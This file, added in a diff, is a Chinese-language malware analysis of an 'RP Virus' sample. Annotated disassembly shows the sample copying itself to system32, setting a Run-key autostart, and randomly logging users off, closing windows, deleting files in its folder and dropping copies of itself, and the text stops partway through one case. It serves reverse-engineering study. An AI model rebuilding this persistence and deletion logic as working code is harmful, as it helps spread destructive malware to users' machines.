@@ -1,0 +1,760 @@
+
+# 病毒行为分析
+
+## 将自身复制到系统目录下，并改名为 `rp.exe`
+
+```asm
+00401D3C   .  C74424 08 040>mov     dword ptr ss:[esp+8], 104        ; |
+00401D44   .  C74424 04 109>mov     dword ptr ss:[esp+4], 00409010   ; |
+00401D4C   .  A1 A0954000   mov     eax, dword ptr ds:[4095A0]       ; |
+00401D51   .  890424        mov     dword ptr ss:[esp], eax          ; |
+00401D54   .  E8 87090000   call    <jmp.&KERNEL32.GetModuleFileName>; \GetModuleFileNameA
+00401D59   .  83EC 0C       sub     esp, 0C
+00401D5C   .  C74424 04 0401000>mov     dword ptr ss:[esp+4], 104                  ; |
+00401D64   .  C70424 30914000   mov     dword ptr ss:[esp], 00409130               ; |ASCII "C:\WINDOWS\system32"
+00401D6B   .  E8 90090000       call    <jmp.&KERNEL32.GetSystemDirectoryA>        ; \GetSystemDirectoryA
+00401D70   .  83EC 08           sub     esp, 8
+00401D73   .  C74424 04 5683400>mov     dword ptr ss:[esp+4], 00408356             ; ||ASCII "\rp.exe"
+00401D7B   .  C70424 30914000   mov     dword ptr ss:[esp], 00409130               ; ||ASCII "C:\WINDOWS\system32"
+00401D82   .  E8 F9070000       call    <jmp.&msvcrt.strcat>                       ; |\strcat "C:\WINDOWS\system32\rp.exe"
+00401D87   .  C74424 08 0000000>mov     dword ptr ss:[esp+8], 0                    ; |
+00401D8F   .  C74424 04 3091400>mov     dword ptr ss:[esp+4], 00409130             ; |ASCII "C:\WINDOWS\system32\rp.exe"
+00401D97   .  C70424 10904000   mov     dword ptr ss:[esp], 00409010               ; |ExistingFileName = "C:\Documents and Settings\Administrator\桌面\3399.__86f"
+00401D9E   .  E8 6D090000       call    <jmp.&KERNEL32.CopyFileA>                  ; \CopyFileA将自身复制到系统目录下，并改名为rp.exe
+00401DA3   .  83EC 0C           sub     esp, 0C
+```
+
+## 注册表操作：设置自启动
+
+```asm
+00401DA6   .  C74424 10 A495400>mov     dword ptr ss:[esp+10], 004095A4            ; |
+00401DAE   .  C74424 0C 0200000>mov     dword ptr ss:[esp+C], 2                    ; |
+00401DB6   .  C74424 08 0000000>mov     dword ptr ss:[esp+8], 0                    ; |
+00401DBE   .  C74424 04 6083400>mov     dword ptr ss:[esp+4], 00408360             ; |ASCII "SOFTWARE\Mircosoft\Windows\CurrentVersion\Run"
+00401DC6   .  C70424 02000080   mov     dword ptr ss:[esp], 80000002               ; |hKey = HKEY_LOCAL_MACHINE
+00401DCD   .  E8 BE090000       call    <jmp.&ADVAPI32.RegOpenKeyExA>              ; \RegOpenKeyExA
+00401DD2   .  83EC 14       sub     esp, 14
+00401DD5   .  C74424 14 040>mov     dword ptr ss:[esp+14], 104       ; |
+00401DDD   .  C74424 10 309>mov     dword ptr ss:[esp+10], 00409130  ; |ASCII "C:\WINDOWS\system32\rp.exe"
+00401DE5   .  C74424 0C 010>mov     dword ptr ss:[esp+C], 1          ; |
+00401DED   .  C74424 08 000>mov     dword ptr ss:[esp+8], 0          ; |
+00401DF5   .  C74424 04 8E8>mov     dword ptr ss:[esp+4], 0040838E   ; |ASCII "Registry Prompt"
+00401DFD   .  A1 A4954000   mov     eax, dword ptr ds:[4095A4]       ; |
+00401E02   .  890424        mov     dword ptr ss:[esp], eax          ; |
+00401E05   .  E8 96090000   call    <jmp.&ADVAPI32.RegSetValueExA>   ; \RegSetValueExA
+00401E0A   .  83EC 18       sub     esp, 18
+00401E0D   .  A1 A4954000   mov     eax, dword ptr ds:[4095A4]       ; |
+00401E12   .  890424        mov     dword ptr ss:[esp], eax          ; |
+00401E15   .  E8 96090000   call    <jmp.&ADVAPI32.RegCloseKey>      ; \RegCloseKey
+00401E1A   .  83EC 04       sub     esp, 4
+```
+
+## 创建两个线程
+
+```asm
+00401E1D   .  C74424 14 000>mov     dword ptr ss:[esp+14], 0         ; |
+00401E25   .  C74424 10 000>mov     dword ptr ss:[esp+10], 0         ; |
+00401E2D   .  C74424 0C 000>mov     dword ptr ss:[esp+C], 0          ; |
+00401E35   .  C74424 08 881>mov     dword ptr ss:[esp+8], 00401B88   ; |
+00401E3D   .  C74424 04 000>mov     dword ptr ss:[esp+4], 0          ; |
+00401E45   .  C70424 000000>mov     dword ptr ss:[esp], 0            ; |
+00401E4C   .  E8 CF080000   call    <jmp.&KERNEL32.CreateThread>     ; \CreateThread创建线程1
+00401E51   .  83EC 18       sub     esp, 18
+00401E54   .  C74424 14 000>mov     dword ptr ss:[esp+14], 0         ; |
+00401E5C   .  C74424 10 000>mov     dword ptr ss:[esp+10], 0         ; |
+00401E64   .  C74424 0C 000>mov     dword ptr ss:[esp+C], 0          ; |
+00401E6C   .  C74424 08 F81>mov     dword ptr ss:[esp+8], 00401BF8   ; |
+00401E74   .  C74424 04 000>mov     dword ptr ss:[esp+4], 0          ; |
+00401E7C   .  C70424 000000>mov     dword ptr ss:[esp], 0            ; |
+00401E83   .  E8 98080000   call    <jmp.&KERNEL32.CreateThread>     ; \CreateThread创建线程2
+00401E88   .  83EC 18       sub     esp, 18
+```
+
+## 每隔 300s 鸣喇叭告警一次
+
+```asm
+00401E8B   >  C70424 E09304>mov     dword ptr ss:[esp], 493E0        ; |300s
+00401E92   .  E8 39080000   call    <jmp.&KERNEL32.Sleep>            ; \Sleep
+00401E97   .  83EC 04       sub     esp, 4
+00401E9A   .  C74424 04 E80>mov     dword ptr ss:[esp+4], 3E8        ; |
+00401EA2   .  C70424 E80300>mov     dword ptr ss:[esp], 3E8          ; |
+00401EA9   .  E8 E2070000   call    <jmp.&KERNEL32.Beep>             ; \Beep
+00401EAE   .  83EC 08       sub     esp, 8
+00401EB1   .^ EB D8         jmp     short 00401E8B			每隔300s鸣喇叭告警一次
+```
+
+## 线程1：通过当前时间计算得到一个随机值，根据该值执行不同的操作
+
+```asm
+00401B8E      C70424 00000000   mov     dword ptr ss:[esp], 0                      ;  200s
+00401B95   .  E8 360B0000       call    <jmp.&KERNEL32.Sleep>                      ; \Sleep
+00401B9A   .  83EC 04           sub     esp, 4
+00401B9D   .  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; ||
+00401BA4   .  E8 B7090000       call    <jmp.&msvcrt.time>                         ; |\time
+00401BA9   .  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401BAC   .  E8 BF090000       call    <jmp.&msvcrt.srand>                        ; \srand
+00401BB1   .  E8 9A090000       call    <jmp.&msvcrt.rand>                         ; [rand
+00401BB6   .  89C1              mov     ecx, eax
+00401BB8   .  B8 67666666       mov     eax, 66666667
+00401BBD   .  F7E9              imul    ecx
+00401BBF   .  C1FA 03           sar     edx, 3
+00401BC2   .  89C8              mov     eax, ecx
+00401BC4   .  C1F8 1F           sar     eax, 1F
+00401BC7   .  29C2              sub     edx, eax
+00401BC9   .  89D0              mov     eax, edx
+00401BCB   .  A3 B4954000       mov     dword ptr ds:[4095B4], eax
+00401BD0   .  8B15 B4954000     mov     edx, dword ptr ds:[4095B4]
+00401BD6   .  89D0              mov     eax, edx
+00401BD8   .  C1E0 02           shl     eax, 2
+00401BDB   .  01D0              add     eax, edx
+00401BDD   .  C1E0 02           shl     eax, 2
+00401BE0   .  29C1              sub     ecx, eax
+00401BE2   .  89C8              mov     eax, ecx
+00401BE4   .  A3 B4954000       mov     dword ptr ds:[4095B4], eax
+00401BE9   .  A1 B4954000       mov     eax, dword ptr ds:[4095B4]
+00401BEE   .  890424            mov     dword ptr ss:[esp], eax
+00401BF1   .  E8 9AF6FFFF       call    00401290
+00401BF6   .^ EB 96             jmp     short 00401B8E
+```
+
+### 计算值等于 1：运行 `notepad.exe`，打开记事本
+
+```asm
+00401299  |.  837D 08 01        cmp     dword ptr ss:[ebp+8], 1                    ; |
+0040129D  |.  75 37             jnz     short 004012D6                             ; |
+0040129F  |.  C74424 14 0500000>mov     dword ptr ss:[esp+14], 5                   ; |
+004012A7  |.  C74424 10 0000000>mov     dword ptr ss:[esp+10], 0                   ; |
+004012AF  |.  C74424 0C 0000000>mov     dword ptr ss:[esp+C], 0                    ; |
+004012B7  |.  C74424 08 5F82400>mov     dword ptr ss:[esp+8], 0040825F             ; |ASCII "notepad.exe"
+004012BF  |.  C74424 04 0000000>mov     dword ptr ss:[esp+4], 0                    ; |
+004012C7  |.  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; |
+004012CE  |.  E8 ED140000       call    <jmp.&SHELL32.ShellExecuteA>               ; \ShellExecuteA
+004012D3  |.  83EC 18           sub     esp, 18
+```
+
+### 计算值如果等于 2：运行 `taskmgr.exe`，打开任务管理器
+
+```asm
+004012D6  |>  837D 08 02        cmp     dword ptr ss:[ebp+8], 2                    ; |
+004012DA  |.  75 37             jnz     short 00401313                             ; |
+004012DC  |.  C74424 14 0500000>mov     dword ptr ss:[esp+14], 5                   ; |
+004012E4  |.  C74424 10 0000000>mov     dword ptr ss:[esp+10], 0                   ; |
+004012EC  |.  C74424 0C 0000000>mov     dword ptr ss:[esp+C], 0                    ; |
+004012F4  |.  C74424 08 6B82400>mov     dword ptr ss:[esp+8], 0040826B             ; |ASCII "taskmgr.exe"
+004012FC  |.  C74424 04 0000000>mov     dword ptr ss:[esp+4], 0                    ; |
+00401304  |.  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; |
+0040130B  |.  E8 B0140000       call    <jmp.&SHELL32.ShellExecuteA>               ; \ShellExecuteA
+00401310  |.  83EC 18           sub     esp, 18
+```
+
+### 计算值如果等于 3：鸣喇叭
+
+```asm
+00401313  |>  837D 08 03        cmp     dword ptr ss:[ebp+8], 3                    ; |
+00401317  |.  75 17             jnz     short 00401330                             ; |
+00401319  |.  C74424 04 9001000>mov     dword ptr ss:[esp+4], 190                  ; |
+00401321  |.  C70424 E8030000   mov     dword ptr ss:[esp], 3E8                    ; |
+00401328  |.  E8 63130000       call    <jmp.&KERNEL32.Beep>                       ; \Beep
+0040132D  |.  83EC 08           sub     esp, 8
+```
+
+### 计算值如果等于 4：访问网站
+
+访问网站地址为 `4c8K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8A6L8X3E0%4L8%4u0D9k6q4)9J5k6h3y4G2L8b7`.`.
+
+```asm
+00401330  |>  837D 08 04        cmp     dword ptr ss:[ebp+8], 4                    ; |
+00401334  |.  75 37             jnz     short 0040136D                             ; |
+00401336  |.  C74424 14 0500000>mov     dword ptr ss:[esp+14], 5                   ; |
+0040133E  |.  C74424 10 0000000>mov     dword ptr ss:[esp+10], 0                   ; |
+00401346  |.  C74424 0C 0000000>mov     dword ptr ss:[esp+C], 0                    ; |
+0040134E  |.  C74424 08 7782400>mov     dword ptr ss:[esp+8], 00408277             ; |ASCII "1d1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4m8A6L8X3E0%4L8%4u0D9k6q4)9J5k6h3y4G2L8b7`.`."
+00401356  |.  C74424 04 0000000>mov     dword ptr ss:[esp+4], 0                    ; |
+0040135E  |.  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; |
+00401365  |.  E8 56140000       call    <jmp.&SHELL32.ShellExecuteA>               ; \ShellExecuteA
+0040136A  |.  83EC 18           sub     esp, 18
+```
+
+### 计算值如果等于 5：注销用户，重启机器
+
+```asm
+0040136D  |>  837D 08 05        cmp     dword ptr ss:[ebp+8], 5                    ; |
+00401371  |.  75 17             jnz     short 0040138A                             ; |
+00401373  |.  C74424 04 0000000>mov     dword ptr ss:[esp+4], 0                    ; |
+0040137B  |.  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; |
+00401382  |.  E8 A9120000       call    <jmp.&USER32.ExitWindowsEx>                ; \ExitWindowsEx
+00401387  |.  83EC 08           sub     esp, 8
+```
+
+### 计算值如果等于 6：发送 `WM_CLOSE` 消息关闭用户当前窗口
+
+```asm
+0040138A  |>  837D 08 06        cmp     dword ptr ss:[ebp+8], 6                    ; |
+0040138E  |.  75 32             jnz     short 004013C2                             ; |
+00401390  |.  E8 AB120000       call    <jmp.&USER32.GetForegroundWindow>          ; |[GetForegroundWindow返回前台窗口（用户当前工作的窗口）
+00401395  |.  A3 98954000       mov     dword ptr ds:[409598], eax                 ; |
+0040139A  |.  C74424 0C 0000000>mov     dword ptr ss:[esp+C], 0                    ; |
+004013A2  |.  C74424 08 0000000>mov     dword ptr ss:[esp+8], 0                    ; |
+004013AA  |.  C74424 04 1000000>mov     dword ptr ss:[esp+4], 10                   ; |WM_CLOSE
+004013B2  |.  A1 98954000       mov     eax, dword ptr ds:[409598]                 ; |
+004013B7  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004013BA  |.  E8 91120000       call    <jmp.&USER32.SendMessageA>                 ; \SendMessageA发送WM_CLOSE消息关闭用户当前窗口
+004013BF  |.  83EC 10           sub     esp, 10
+```
+
+### 计算值如果等于 7：将病毒程序窗口标题设置为 `RP Virus`
+
+```asm
+004013C2  |>  837D 08 07        cmp     dword ptr ss:[ebp+8], 7                    ; |
+004013C6  |.  75 22             jnz     short 004013EA                             ; |
+004013C8  |.  E8 73120000       call    <jmp.&USER32.GetForegroundWindow>          ; |[GetForegroundWindow
+004013CD  |.  A3 98954000       mov     dword ptr ds:[409598], eax                 ; |
+004013D2  |.  C74424 04 9082400>mov     dword ptr ss:[esp+4], 00408290             ; |ASCII "RP Virus"
+004013DA  |.  A1 98954000       mov     eax, dword ptr ds:[409598]                 ; |
+004013DF  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004013E2  |.  E8 79120000       call    <jmp.&USER32.SetWindowTextA>               ; \SetWindowTextA
+004013E7  |.  83EC 08           sub     esp, 8
+```
+
+### 计算值如果等于 8：查找病毒所在目录的所有文件并删除
+
+```asm
+004013EA  |>  837D 08 08        cmp     dword ptr ss:[ebp+8], 8                    ; |
+004013EE  |.  75 52             jnz     short 00401442                             ; |
+004013F0  |.  8D85 B8FEFFFF     lea     eax, dword ptr ss:[ebp-148]                ; |
+004013F6  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; |
+004013FA  |.  C70424 99824000   mov     dword ptr ss:[esp], 00408299               ; |ASCII "*.*"
+00401401  |.  E8 9A120000       call    <jmp.&KERNEL32.FindFirstFileA>             ; \FindFirstFileA
+00401406  |.  83EC 08           sub     esp, 8
+00401409  |.  A3 9C954000       mov     dword ptr ds:[40959C], eax
+0040140E  |>  8D85 B8FEFFFF     /lea     eax, dword ptr ss:[ebp-148]               ; |
+00401414  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; |
+00401418  |.  A1 9C954000       |mov     eax, dword ptr ds:[40959C]                ; |
+0040141D  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401420  |.  E8 8B120000       |call    <jmp.&KERNEL32.FindNextFileA>             ; \FindNextFileA
+00401425  |.  83EC 08           |sub     esp, 8
+00401428  |.  85C0              |test    eax, eax                                  ; |
+0040142A  |.  74 16             |je      short 00401442                            ; |
+0040142C  |.  8D85 B8FEFFFF     |lea     eax, dword ptr ss:[ebp-148]               ; |
+00401432  |.  83C0 2C           |add     eax, 2C                                   ; |
+00401435  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401438  |.  E8 83120000       |call    <jmp.&KERNEL32.DeleteFileA>               ; \DeleteFileA
+0040143D  |.  83EC 04           |sub     esp, 4
+00401440  |.^ EB CC             \jmp     short 0040140E
+```
+
+### 计算值如果等于 9：查找病毒所在目录，然后打开该目录的上一级目录
+
+```asm
+00401442  |>  837D 08 09        cmp     dword ptr ss:[ebp+8], 9                    ; |
+00401446  |.  75 7A             jnz     short 004014C2                             ; |
+00401448  |.  8D85 B8FEFFFF     lea     eax, dword ptr ss:[ebp-148]                ; |
+0040144E  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; |
+00401452  |.  C70424 99824000   mov     dword ptr ss:[esp], 00408299               ; |ASCII "*.*"
+00401459  |.  E8 42120000       call    <jmp.&KERNEL32.FindFirstFileA>             ; \FindFirstFileA
+0040145E  |.  83EC 08           sub     esp, 8
+00401461  |.  A3 9C954000       mov     dword ptr ds:[40959C], eax
+00401466  |>  8D85 B8FEFFFF     /lea     eax, dword ptr ss:[ebp-148]               ; |
+0040146C  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; |
+00401470  |.  A1 9C954000       |mov     eax, dword ptr ds:[40959C]                ; |
+00401475  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401478  |.  E8 33120000       |call    <jmp.&KERNEL32.FindNextFileA>             ; \FindNextFileA
+0040147D  |.  83EC 08           |sub     esp, 8
+00401480  |.  85C0              |test    eax, eax                                  ; |
+00401482  |.  74 3E             |je      short 004014C2                            ; |
+00401484  |.  C74424 14 0500000>|mov     dword ptr ss:[esp+14], 5                  ; |
+0040148C  |.  C74424 10 0000000>|mov     dword ptr ss:[esp+10], 0                  ; |
+00401494  |.  C74424 0C 0000000>|mov     dword ptr ss:[esp+C], 0                   ; |
+0040149C  |.  8D85 B8FEFFFF     |lea     eax, dword ptr ss:[ebp-148]               ; |
+004014A2  |.  83C0 2C           |add     eax, 2C                                   ; |
+004014A5  |.  894424 08         |mov     dword ptr ss:[esp+8], eax                 ; |
+004014A9  |.  C74424 04 0000000>|mov     dword ptr ss:[esp+4], 0                   ; |
+004014B1  |.  C70424 00000000   |mov     dword ptr ss:[esp], 0                     ; |
+004014B8  |.  E8 03130000       |call    <jmp.&SHELL32.ShellExecuteA>              ; \ShellExecuteA
+004014BD  |.  83EC 18           |sub     esp, 18
+004014C0  |.^ EB A4             \jmp     short 00401466
+```
+
+### 计算值如果等于 10：等待 5ms 后发送 `WM_CLOSE` 消息关闭用户当前窗口
+
+```asm
+004014C2  |>  837D 08 0A        cmp     dword ptr ss:[ebp+8], 0A
+004014C6  |.  75 5F             jnz     short 00401527
+004014C8  |.  C705 B0954000 000>mov     dword ptr ds:[4095B0], 0
+004014D2  |>  813D B0954000 F30>/cmp     dword ptr ds:[4095B0], 1F3                ; |
+004014DC  |.  7F 49             |jg      short 00401527                            ; |
+004014DE  |.  C70424 05000000   |mov     dword ptr ss:[esp], 5                     ; |
+004014E5  |.  E8 E6110000       |call    <jmp.&KERNEL32.Sleep>                     ; \Sleep
+004014EA  |.  83EC 04           |sub     esp, 4
+004014ED  |.  E8 4E110000       |call    <jmp.&USER32.GetForegroundWindow>         ; |[GetForegroundWindow
+004014F2  |.  A3 98954000       |mov     dword ptr ds:[409598], eax                ; |
+004014F7  |.  C74424 0C 0000000>|mov     dword ptr ss:[esp+C], 0                   ; |
+004014FF  |.  C74424 08 0000000>|mov     dword ptr ss:[esp+8], 0                   ; |
+00401507  |.  C74424 04 1000000>|mov     dword ptr ss:[esp+4], 10                  ; |WM_CLOSE
+0040150F  |.  A1 98954000       |mov     eax, dword ptr ds:[409598]                ; |
+00401514  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401517  |.  E8 34110000       |call    <jmp.&USER32.SendMessageA>                ; \SendMessageA发送WM_CLOSE消息关闭用户当前窗口
+0040151C  |.  83EC 10           |sub     esp, 10
+0040151F  |.  FF05 B0954000     |inc     dword ptr ds:[4095B0]
+00401525  |.^ EB AB             \jmp     short 004014D2
+```
+
+### 计算值如果等于 11：运行 `notepad.exe`
+
+```asm
+00401527  |>  837D 08 0B        cmp     dword ptr ss:[ebp+8], 0B
+0040152B  |.  75 55             jnz     short 00401582
+0040152D  |.  C705 B0954000 000>mov     dword ptr ds:[4095B0], 0
+00401537  |>  813D B0954000 F30>/cmp     dword ptr ds:[4095B0], 1F3                ; |
+00401541  |.  7F 3F             |jg      short 00401582                            ; |
+00401543  |.  C74424 14 0000000>|mov     dword ptr ss:[esp+14], 0                  ; |
+0040154B  |.  C74424 10 0000000>|mov     dword ptr ss:[esp+10], 0                  ; |
+00401553  |.  C74424 0C 0000000>|mov     dword ptr ss:[esp+C], 0                   ; |
+0040155B  |.  C74424 08 5F82400>|mov     dword ptr ss:[esp+8], 0040825F            ; |ASCII "notepad.exe"
+00401563  |.  C74424 04 0000000>|mov     dword ptr ss:[esp+4], 0                   ; |
+0040156B  |.  C70424 00000000   |mov     dword ptr ss:[esp], 0                     ; |
+00401572  |.  E8 49120000       |call    <jmp.&SHELL32.ShellExecuteA>              ; \ShellExecuteA
+00401577  |.  83EC 18           |sub     esp, 18
+0040157A  |.  FF05 B0954000     |inc     dword ptr ds:[4095B0]
+00401580  |.^ EB B5             \jmp     short 00401537
+```
+
+### 计算值如果等于 12：鸣喇叭告警
+
+```asm
+00401582  |>  837D 08 0C        cmp     dword ptr ss:[ebp+8], 0C
+00401586  |.  75 32             jnz     short 004015BA
+00401588  |.  C705 B0954000 000>mov     dword ptr ds:[4095B0], 0
+00401592  |>  833D B0954000 02  /cmp     dword ptr ds:[4095B0], 2                  ; |
+00401599  |.  7F 1F             |jg      short 004015BA                            ; |
+0040159B  |.  C74424 04 E803000>|mov     dword ptr ss:[esp+4], 3E8                 ; |
+004015A3  |.  C70424 2C010000   |mov     dword ptr ss:[esp], 12C                   ; |
+004015AA  |.  E8 E1100000       |call    <jmp.&KERNEL32.Beep>                      ; \Beep
+004015AF  |.  83EC 08           |sub     esp, 8
+004015B2  |.  FF05 B0954000     |inc     dword ptr ds:[4095B0]
+004015B8  |.^ EB D8             \jmp     short 00401592
+```
+
+### 计算值如果等于 13
+
+#### 获取病毒自身的路径
+
+```asm
+004015BA  |>  837D 08 0D        cmp     dword ptr ss:[ebp+8], 0D                   ; |
+004015BE  |.  0F85 18010000     jnz     004016DC                                   ; |
+004015C4  |.  C74424 08 0401000>mov     dword ptr ss:[esp+8], 104                  ; |
+004015CC  |.  C74424 04 1090400>mov     dword ptr ss:[esp+4], 00409010             ; |
+004015D4  |.  A1 A0954000       mov     eax, dword ptr ds:[4095A0]                 ; |
+004015D9  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004015DC  |.  E8 FF100000       call    <jmp.&KERNEL32.GetModuleFileNameA>         ; \GetModuleFileNameA
+004015E1  |.  83EC 0C           sub     esp, 0C
+```
+
+#### 以 `rb` 方式打开 `3399.__86f` 文件，并计算文件长度
+
+```asm
+004015E4  |.  C74424 04 9D82400>mov     dword ptr ss:[esp+4], 0040829D             ; |||||ASCII "rb"
+004015EC  |.  C70424 10904000   mov     dword ptr ss:[esp], 00409010               ; |||||
+004015F3  |.  E8 F80F0000       call    <jmp.&msvcrt.fopen>                        ; ||||\fopen
+004015F8  |.  A3 A8954000       mov     dword ptr ds:[4095A8], eax                 ; ||||
+004015FD  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; ||||
+00401602  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||||
+00401605  |.  E8 D60F0000       call    <jmp.&msvcrt.ftell>                        ; |||\ftell
+0040160A  |.  8985 B4FEFFFF     mov     dword ptr ss:[ebp-14C], eax                ; |||
+00401610  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; |||
+00401616  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||
+00401619  |.  E8 B20F0000       call    <jmp.&msvcrt.malloc>                       ; ||\malloc
+0040161E  |.  A3 94954000       mov     dword ptr ds:[409594], eax                 ; ||
+00401623  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; ||
+00401628  |.  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; ||
+0040162C  |.  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; ||
+00401634  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; ||
+0040163A  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; ||
+0040163E  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; ||
+00401643  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||
+00401646  |.  E8 750F0000       call    <jmp.&msvcrt.fread>                        ; |\fread
+0040164B  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |
+00401650  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401653  |.  E8 580F0000       call    <jmp.&msvcrt.fclose>                       ; \fclose
+```
+
+#### 循环创建文件
+
+```asm
+00401658  |.  C705 B0954000 000>mov     dword ptr ds:[4095B0], 0
+00401662  |>  A1 B0954000       /mov     eax, dword ptr ds:[4095B0]                ; |||
+00401667  |.  833C85 80734000 0>|cmp     dword ptr ds:[eax*4+407380], 0            ; |||
+0040166F  |.  74 5E             |je      short 004016CF                            ; |||
+00401671  |.  C74424 04 A082400>|mov     dword ptr ss:[esp+4], 004082A0            ; |||ASCII "wb"
+00401679  |.  A1 B0954000       |mov     eax, dword ptr ds:[4095B0]                ; |||
+0040167E  |.  8B0485 80734000   |mov     eax, dword ptr ds:[eax*4+407380]          ; |||
+00401685  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |||
+00401688  |.  E8 630F0000       |call    <jmp.&msvcrt.fopen>                       ; ||\fopen
+0040168D  |.  A3 AC954000       |mov     dword ptr ds:[4095AC], eax                ; ||
+00401692  |.  A1 AC954000       |mov     eax, dword ptr ds:[4095AC]                ; ||
+00401697  |.  894424 0C         |mov     dword ptr ss:[esp+C], eax                 ; ||
+0040169B  |.  C74424 08 0100000>|mov     dword ptr ss:[esp+8], 1                   ; ||
+004016A3  |.  8B85 B4FEFFFF     |mov     eax, dword ptr ss:[ebp-14C]               ; ||
+004016A9  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; ||
+004016AD  |.  A1 94954000       |mov     eax, dword ptr ds:[409594]                ; ||
+004016B2  |.  890424            |mov     dword ptr ss:[esp], eax                   ; ||
+004016B5  |.  E8 E60E0000       |call    <jmp.&msvcrt.fwrite>                      ; |\fwrite
+004016BA  |.  A1 AC954000       |mov     eax, dword ptr ds:[4095AC]                ; |
+004016BF  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+004016C2  |.  E8 E90E0000       |call    <jmp.&msvcrt.fclose>                      ; \fclose
+004016C7  |.  FF05 B0954000     |inc     dword ptr ds:[4095B0]
+004016CD  |.^ EB 93             \jmp     short 00401662
+004016CF  |>  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; |
+004016D4  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004016D7  |.  E8 B40E0000       call    <jmp.&msvcrt.free>                         ; \free
+```
+
+### 计算值如果等于 14
+
+```asm
+004016DC  |>  837D 08 0E        cmp     dword ptr ss:[ebp+8], 0E                   ; |
+004016E0  |.  0F85 91010000     jnz     00401877                                   ; |
+004016E6  |.  C74424 04 0401000>mov     dword ptr ss:[esp+4], 104                  ; |
+004016EE  |.  C70424 50924000   mov     dword ptr ss:[esp], 00409250               ; |
+004016F5  |.  E8 F60F0000       call    <jmp.&KERNEL32.GetWindowsDirectoryA>       ; \GetWindowsDirectoryA
+004016FA  |.  83EC 08           sub     esp, 8
+```
+
+#### 获取 `RP_Virus.exe` 的路径
+
+```asm
+004016FD  |.  C74424 04 A382400>mov     dword ptr ss:[esp+4], 004082A3             ; ||ASCII "\RP_Virus.exe"
+00401705  |.  C70424 50924000   mov     dword ptr ss:[esp], 00409250               ; ||ASCII "C:\WINDOWS\RP_Virus.exe"
+0040170C  |.  E8 6F0E0000       call    <jmp.&msvcrt.strcat>                       ; |\strcat
+00401711  |.  C74424 08 0401000>mov     dword ptr ss:[esp+8], 104                  ; |
+00401719  |.  C74424 04 1090400>mov     dword ptr ss:[esp+4], 00409010             ; |
+00401721  |.  A1 A0954000       mov     eax, dword ptr ds:[4095A0]                 ; |
+00401726  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401729  |.  E8 B20F0000       call    <jmp.&KERNEL32.GetModuleFileNameA>         ; \GetModuleFileNameA
+0040172E  |.  83EC 0C           sub     esp, 0C
+```
+
+#### 计算 `3399.__86f` 文件长度并在该文件目录下创建一系列文件
+
+```asm
+00401731  |.  C74424 04 9D82400>mov     dword ptr ss:[esp+4], 0040829D             ; ||||||||||ASCII "rb"
+00401739  |.  C70424 10904000   mov     dword ptr ss:[esp], 00409010               ; ||||||||||path = "C:\Documents and Settings\Administrator\桌面\3399.__86f"
+00401740  |.  E8 AB0E0000       call    <jmp.&msvcrt.fopen>                        ; |||||||||\fopen
+00401745  |.  A3 A8954000       mov     dword ptr ds:[4095A8], eax                 ; |||||||||
+0040174A  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |||||||||
+0040174F  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||||||||
+00401752  |.  E8 890E0000       call    <jmp.&msvcrt.ftell>                        ; ||||||||\ftell
+00401757  |.  8985 B4FEFFFF     mov     dword ptr ss:[ebp-14C], eax                ; ||||||||
+0040175D  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; ||||||||
+00401763  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||||||||
+00401766  |.  E8 650E0000       call    <jmp.&msvcrt.malloc>                       ; |||||||\malloc
+0040176B  |.  A3 94954000       mov     dword ptr ds:[409594], eax                 ; |||||||
+00401770  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |||||||
+00401775  |.  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; |||||||
+00401779  |.  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; |||||||
+00401781  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; |||||||
+00401787  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; |||||||
+0040178B  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; |||||||
+00401790  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||||||
+00401793  |.  E8 280E0000       call    <jmp.&msvcrt.fread>                        ; ||||||\fread
